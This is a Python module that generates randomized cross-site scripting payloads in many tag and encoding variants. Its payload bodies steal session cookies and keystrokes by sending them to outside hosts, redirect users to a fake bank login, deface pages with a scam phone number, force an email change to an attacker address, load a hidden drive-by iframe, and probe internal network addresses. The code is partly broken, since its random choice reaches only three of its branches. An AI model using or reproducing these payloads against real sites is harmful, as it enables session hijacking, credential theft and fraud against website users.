import random
import urllib.parse

class XSSPayloadGenerator:
    """
    Generates various types of Cross-Site Scripting (XSS) payloads with randomized components.
    """
    @staticmethod
    def _get_random_event_handler() -> str:
        """Returns a random common XSS event handler."""
        return random.choice([
            "onload", "onerror", "onmouseover", "onclick", "onfocus", "onblur",
            "onchange", "onsubmit", "oninput", "onkeydown", "onkeyup"
        ])

    @staticmethod
    def _get_random_xss_alert() -> str:
        """Returns a random JavaScript alert/execution string."""
        choice = random.randint(0, 2)
        if choice == 0: # Session Hijacking / Cookie Theft
            return 'new Image().src = "https://wenojhdskdsf.com/log_cookie.php?c=" + document.cookie;'
        elif choice == 1: # Redirection to a Malicious Site (Phishing)
            return 'window.location.href = "https://pankofamerika.com/fake_login";'
        elif choice == 2: # Defacement / Content Modification
            return "document.body.innerHTML = '<h1>Trust me!</h1><p>Call me at 1 888 345 8443.</p>';"
        elif choice == 3: # Defacement / Content Modification
            return "document.getElementById('header').innerHTML = '<img src=\"http://wererddf.com/evil_logo.png\">';"
        elif choice == 4: # Keylogging
            return "document.onkeypress = function(e) { var key = String.fromCharCode(e.keyCode); new Image().src = \"http://attacker.com/log_keys.php?k=\" + encodeURIComponent(key);};"
        elif choice == 5: # Performing Actions on Behalf of the User (CSRF-like actions)
            return "fetch('/api/user/change_email', {method: 'POST', headers: {'Content-Type': 'application/json' },body: JSON.stringify({ newEmail: 'attacker@evil.com' }) }) .then(response => console.log('Email change attempt:', response.status));"
        elif choice == 6: #  Drive-by Downloads
            return "var iframe = document.createElement('iframe');iframe.src = 'http://malicious-site.com/exploit.html';  iframe.style.display = 'none';document.body.appendChild(iframe);"
        elif choice == 7: # Internal Network Scanning / Port Scanning
            return "var internalIPs = ['192.168.1.1', '10.0.0.5'];internalIPs.forEach(function(ip) { var img = new Image(); img.onerror = function() { console.log(ip + ' is down or port closed'); }; img.onload = function() { console.log(ip + ' is up!'); }; img.src = 'http://' + ip + ':80/nonexistent.jpg';  });"
        elif choice == 8: # 
            return ""
        elif choice == 9: # 
            return ""
        else:
            return "console.log('XSS')" # Less disruptive, might bypass some WAFs

    @staticmethod
    def generate_script_tag_payload() -> str:
        """Generates a basic <script> tag payload."""
        alert_code = XSSPayloadGenerator._get_random_xss_alert()
        return f"<script>{alert_code}</script>"

    @staticmethod
    def generate_image_error_payload() -> str:
        """Generates an <img> tag with an onerror event."""
        alert_code = XSSPayloadGenerator._get_random_xss_alert()
        return f"<img src=x {XSSPayloadGenerator._get_random_event_handler()}={alert_code}>"

    @staticmethod
    def generate_svg_payload() -> str:
        """Generates an <svg> tag with an onload event."""
        alert_code = XSSPayloadGenerator._get_random_xss_alert()
        return f"<svg/{XSSPayloadGenerator._get_random_event_handler()}={alert_code}>"

    @staticmethod
    def generate_body_event_payload() -> str:
        """Generates a <body> tag with an event handler."""
        alert_code = XSSPayloadGenerator._get_random_xss_alert()
        return f"<body {XSSPayloadGenerator._get_random_event_handler()}={alert_code}>"

    @staticmethod
    def generate_a_href_javascript_payload() -> str:
        """Generates an <a> tag with javascript: pseudo-protocol."""
        alert_code = XSSPayloadGenerator._get_random_xss_alert()
        link_text = random.choice(["Click me", "Download", "Login"])
        return f"<a href=\"javascript:{alert_code}\">{link_text}</a>"

    @staticmethod
    def generate_input_event_payload() -> str:
        """Generates an <input> tag with an event handler."""
        alert_code = XSSPayloadGenerator._get_random_xss_alert()
        input_type = random.choice(["text", "hidden", "search"])
        return f"<input type={input_type} {XSSPayloadGenerator._get_random_event_handler()}={alert_code} autofocus>"

    @staticmethod
    def generate_data_uri_payload() -> str:
        """Generates a data URI payload."""
        alert_code = XSSPayloadGenerator._get_random_xss_alert()
        # Data URI needs to be URL encoded itself
        encoded_html = urllib.parse.quote_plus(f"<script>{alert_code}</script>")
        return f"data:text/html,{encoded_html}"

    @staticmethod
    def generate_html_entity_payload() -> str:
        """Generates a payload with HTML entities for obfuscation."""
        alert_code = XSSPayloadGenerator._get_random_xss_alert()
        # Basic script tag, then apply HTML entity encoding to parts
        payload = f"<script>{alert_code}</script>"
        # Randomly choose to encode parts or the whole thing
        if random.random() < 0.5: # Encode whole
            return "".join(f"&#x{ord(c):x};" for c in payload)
        else: # Encode parts
            return f"<img src=x onerror=alert&#40;1&#41;>" # Fixed example for now, can be more dynamic

    @staticmethod
    def get_random_xss_payload() -> str:
        """Returns a random XSS payload by choosing from different generation types."""
        generator_functions = [
            XSSPayloadGenerator.generate_script_tag_payload,
            XSSPayloadGenerator.generate_image_error_payload,
            XSSPayloadGenerator.generate_svg_payload,
            XSSPayloadGenerator.generate_body_event_payload,
            XSSPayloadGenerator.generate_a_href_javascript_payload,
            XSSPayloadGenerator.generate_input_event_payload,
            XSSPayloadGenerator.generate_data_uri_payload,
            XSSPayloadGenerator.generate_html_entity_payload,
        ]
        chosen_generator = random.choice(generator_functions)
        return chosen_generator()